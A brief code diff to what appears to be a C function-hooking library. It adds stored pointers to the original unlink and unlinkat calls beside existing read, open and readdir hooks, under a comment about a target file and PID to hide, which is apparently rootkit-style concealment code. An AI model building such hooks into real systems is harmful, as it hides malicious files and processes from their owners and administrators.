@@ -12,6 +12,8 @@
 // Original function pointers
 static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
 static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
+static int (*orig_unlink)(const char *pathname) = NULL;
+static int (*orig_unlinkat)(int dirfd, const char *pathname, int flags) = NULL;
 static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
 
 // Target file and PID to hide
